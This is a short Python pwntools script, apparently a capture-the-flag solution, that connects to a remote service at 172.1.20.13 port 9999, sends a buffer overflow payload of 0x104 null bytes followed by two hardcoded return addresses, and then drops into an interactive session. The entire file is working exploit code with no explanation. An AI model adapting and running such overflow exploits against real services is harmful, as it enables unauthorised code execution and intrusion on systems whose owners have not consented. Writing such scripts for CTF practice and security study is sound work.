from pwn import*
context.log_level = 'DEBUG'
#p = process('./main')
p = remote('172.1.20.13',9999)
payload = '\x00'*0x104 + p32(0x104DC) + p32(0x104A0)
p.sendline(payload)
p.interactive()
